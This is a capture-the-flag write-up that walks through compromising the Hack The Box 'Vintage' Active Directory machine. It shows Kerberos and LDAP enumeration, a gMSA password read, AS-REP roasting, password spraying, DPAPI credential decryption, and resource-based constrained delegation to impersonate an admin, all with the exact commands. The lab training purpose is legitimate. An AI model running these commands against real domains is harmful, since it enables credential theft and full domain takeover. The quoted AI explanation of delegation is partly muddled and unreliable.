# Season 7 - Vintage Windows Hard Box


## Initial Foothold
We start with P.Rosa user credentials and based on the nmap scan there is no website/server to search for vulns. So let's start enumerating this machine.

I started by gathering some info using NetExec in the SMB service.

Note: NTLM authentication is disabled so you need to create tickets using getTGT from impacket or kinit.
```bash
# list of shares;
nxc smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --shares

# list of users;
nxc smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --users

# More complete list with also services, brute force rid;
nxc smb dc01.vintage.htb -d vintage.htb -u P.rosa -k --use-kcache --rid-brute
```

That's all you can get from SMB, which is not much, so you move to LDAP using bloodhound.

```bash
nxc ldap 10.10.11.45 -u P.Rosa@vintage.htb --use-kcache  --bloodhound --collection All --dns-server 10.10.11.45
```

Import it to Bloodhound and analyze it, P.Rosa can't do much so keep looking.

At some point you will spot a domain which is most likely a file server (because of the name lol) called FS01.

FS01 is part of two groups:

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328174201.png)

This group is known to have some security issues which can help you get some more information/foothold about the system you're attacking.

There is several ways to do this, but i've used [pre2k](https://github.com/garrettfoster13/pre2k) which the whole purpose is to find things in PRE-WINDOWS 2000 COMPATIBLE ACCESS :D

```bash
pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile list-of-users.txt # users came from the rid brute force
```

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328174652.png)

So now you have the password for the FS01 Domain, which will be used in this case because the group DOMAIN COMPUTERS has ability to read the password hash of a user called GMSA01$ as you can see:

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328174916.png)

So now since you have FS01 credentials to create a ticket and since FS01 is part of Domain Computers group you can use the ReadGMSAPassword to get more privileges.

## Getting More Users

First of all you will create a ticket for FS01 using getTGT and then use the ticket to request the stored password of the user GMSA01 using BloodyAD.

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword # get the attribute where the password is stored from the object GMSA01 user :D
```

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328175455.png)

The NTLM Hash will let us create a valid kerberos ticket without the user password, why? Don't know :p

```bash
getTGT.py 'vintage.htb/GMSA01$' -hashes <hash>
```

Lateral movement is made because we can add ourself inside SERVICEMANAGERS groups, which will own all service accounts in the domain.

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328180014.png)

Accounts Owned:
![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328180125.png)

```bash
# Adding user to desired group.
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k add groupMember "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB" 'GMSA01$'

# Remove PRE_AUTH from owned service accounts.
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH

# Also, enabled SVC_SQL because this account is disabled (you get this info from netexec users enumeration).
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE

# Then use GetNPUsers to export hashes (which is possible because we removed PRE_AUTH)
GetNPUsers.py vintage.htb/ -request -outputfile hashes_tgt.txt -format hashcat -usersfile ~/dump/htb/vintage/users.txt

# Crack all the hashes and you should get the password of svc_sql.
# Passwordspray using kerbrute for discharge of conscience since we have 120321 users.
kerbrute passwordspray -d vintage.htb --dc 10.10.11.45 users.txt <pass>
```

After the password spray you will end up with one more user since they use the same password as the service, the user C.Neri which can login in the system.

User conquered!

Because of a Link to Microsoft Edge in the Desktop you can guess that the privsec will involve leaking stored credentials from DPAPI.

DPAPI is an API provided by Windows, which will encrypt the credentials you give to them using the user's credentials as keys.

Since whatever service/app can use it to store credentials, there is more than one place where this credentials could be stored. But the ones that we want are in the directories:

```Powershell
# Encrypted Credential blob.
download C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\*

# Keys used for encryption (you need to guess which is the right by trying i think).
download C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\*
```

Go back to host and use impacket-dpapi.

```bash
# Decrypted the key.
dpapi.py masterkey -file <file> -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password <pass_from_the_user>

# Use the decrypted key to decrypted the blob credential.
dpapi.py credential -file <blob_creds> -key <dec_key>
```

This will give you another user: c.neri_adm FS01

Taking a look at bloodhound for our new users we can see we have rights for the group called DELEGATEADMINS

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328182211.png)

What we are going to do here is pretty nasty and i couldn't figure it out by myself, a guy helped me to find this.

DELEGATEDADMINS group grants the privilege to impersonate any user in the domains that it's part, most specifically the "msDS-AllowedToActOnBehalfOfOtherIdentity"

Find more [here](https://www.fortalicesolutions.com/posts/hunting-resource-based-constrained-delegation-in-active-directory)

So to exploit this we need first to add a machine/service account in the group. why? Because RBCD can only be used by accounts with SPN, which can also only be used by machine/service accounts unless we have a user which was assigned a SPN manually.

Be aware that this exploit use different accounts to work so open different terminals so you can have different shell variables with the kerberos tokens.

```bash
# c.neri_adm account is used to add svc_sql (the only service account we have) since he is the one who has GenericWrite to the group.
bloodyAD --host dc01.vintage.htb -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
[+] SVC_SQL added to DELEGATEDADMINS

# Now we need to grant a SPN to svc_sql using the C.Neri account.
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/whatever"
[+] SVC_SQLs servicePrincipalName has been updated

# Now our service user has a valid SPN and is part of the group, as svc_sql, we can request a ticket for another user using the -impersonate <user>.
getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:<password>'

[*] Impersonating L.BIANCHI_ADM
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

# Now as the L.BIANCHI, get the root flag accessing the CIF service.
wmiexec.py -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb -k
> type Administrator\Desktop\root.txt
```

How does it work by DeepSeek:

- `getST` sends a request to the KDC (Key Distribution Center, i.e., the Domain Controller):  
    _"Hey, I’m `SVC_SQL$`. User `L.BIANCHI_ADM` is trying to access me. Give me a ticket for them!"_
- The KDC checks:	
	- Does `SVC_SQL$` have an SPN? → **Yes** (you set `cifs/fake` earlier).
	- Is `SVC_SQL$` allowed to request tickets for `L.BIANCHI_ADM`? → **Yes** (because it’s in `DELEGATEDADMINS` or has RBCD rights).
- 
- You Ask the KDC to "Forward" the Ticket to CIFS/dc01
	- getST sends the ticket from Step 1 back to the KDC and says:
	_"Now, I want to use L.BIANCHI_ADM’s ticket to access CIFS/dc01.vintage.htb."_
	- The KDC checks:
		- Is SVC_SQL$ listed in dc01’s msDS-AllowedToActOnBehalfOfOtherIdentity? → Yes (because of RBCD).
		- Is the ticket forwardable? → Yes (from Step 1).
- Ticket to access CIFS (SMB file shares) as L.BIANCHI_ADM —without knowing their password.

![](capture-the-flag/htb/season7/attachments/Pasted%20image%2020250328185617.png)